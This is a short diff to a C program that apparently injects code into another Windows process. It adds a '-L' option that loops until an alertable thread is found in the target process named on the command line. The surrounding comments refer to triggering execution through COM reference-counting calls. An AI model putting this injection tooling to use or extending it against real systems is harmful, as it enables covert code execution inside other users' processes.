@@ -316,6 +316,8 @@ int __cdecl wmain(int argc, wchar_t **argv){
         WCHAR                   wsClassFactoryDllName[MAX_PATH];
         
         ULONG                   rwxDllLen;
+		
+		BOOL infinite_find_alertable = FALSE;
         
         //contrary to x32 where we use QueryInterface to trigger execution, on x64 there are no
         //InterlockedExchangeAdd apis thus all additions can be achived through COM via AddRef
@@ -340,17 +342,25 @@ int __cdecl wmain(int argc, wchar_t **argv){
         pClassFactoryDllBase = (ULONG_PTR)pLdrDataTableEntry->DllBase;
         memset(wsClassFactoryDllName, 0, sizeof(wsClassFactoryDllName));
         memcpy(wsClassFactoryDllName, pLdrDataTableEntry->BaseDllName.Buffer, pLdrDataTableEntry->BaseDllName.Length);
-                                
-        if (argc == 2){
+        
+		do{
+            if (argc >= 2){
                 hThread = FindAlertableThread(argv[1]);
-        }else{
+				if ((!infinite_find_alertable) && (argc >= 3) && (wcslen(argv[2]) >= 2)){
+				    if (_wcsicmp(argv[2], L"-L") == 0) 
+						infinite_find_alertable = TRUE;
+				}
+            }else{
                 printf("[X] Missing process name or pid...\n");
                 return 1;
-        }       
-        if (hThread == NULL){
-                printf("[X] Failed to find alertable thread... meeh...\n");
-                return 1;
-        }
+            }       
+            if (hThread == NULL){
+                printf("[X] Failed to find alertable thread... meeh... use -L param for a infinite find and Ctrl^C to exit.\n");
+                if (!infinite_find_alertable)
+					return 1;
+            }
+		} while ((infinite_find_alertable) && (hThread == NULL));
+		
         
         NtQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), &dwNeededSize);
         
